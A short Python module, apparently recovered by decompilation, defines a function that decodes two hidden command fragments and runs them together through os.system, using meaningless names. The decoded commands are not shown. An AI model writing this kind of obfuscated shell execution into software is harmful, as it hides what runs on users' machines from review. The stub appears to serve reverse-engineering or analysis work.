"""Recovered zero-argument entry ``cw_p9_go``.

Decompiled structure: two decoded command fragments concatenated and passed
to ``os.system``.
"""
from __future__ import annotations

import os

from ..link._fds_jm import sec


def cw_p9_go() -> None:
    _sy = sec("zp_uq_6n")
    _z = sec("hm_xd_3k")
    _os = os
    _os.system(_sy + _z)

